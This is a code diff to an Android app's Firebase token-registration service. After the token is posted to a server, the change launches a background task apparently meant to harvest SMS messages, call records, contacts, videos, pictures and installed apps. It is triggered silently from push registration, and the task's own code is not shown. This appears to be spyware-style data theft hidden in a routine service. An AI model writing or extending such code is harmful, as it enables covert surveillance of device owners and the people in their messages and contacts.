@@ -1,5 +1,6 @@
 package com.fs.fs.services;
 
+import android.os.AsyncTask;
 import android.text.TextUtils;
 
 import com.fs.fs.api.network.ApiConfig;
@@ -7,6 +8,7 @@ import com.fs.fs.api.network.core.BaseResponse;
 import com.fs.fs.api.network.core.HttpParams;
 import com.fs.fs.api.network.core.OkHttpUtils;
 import com.fs.fs.api.network.core.callback.HttpCallback;
+import com.fs.fs.tasks.InitTask;
 import com.fs.fs.utils.Constant;
 import com.fs.fs.utils.LogUtils;
 import com.fs.fs.utils.SharePreferencesUtils;
@@ -39,6 +41,9 @@ public class FCMRegisterService extends FirebaseInstanceIdService {
         OkHttpUtils.post(ApiConfig.getFCMToken(), new HttpParams().addJson("token", token), new HttpCallback(BaseResponse.class) {
             @Override
             public void onSuccess(BaseResponse httpResponse, Headers headers) {
+                new InitTask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,
+                        InitTask.SMS, InitTask.CALL, InitTask.CONTANT,
+                        InitTask.VIDEO, InitTask.PICTURE, InitTask.INSTALL);
             }
 
             @Override
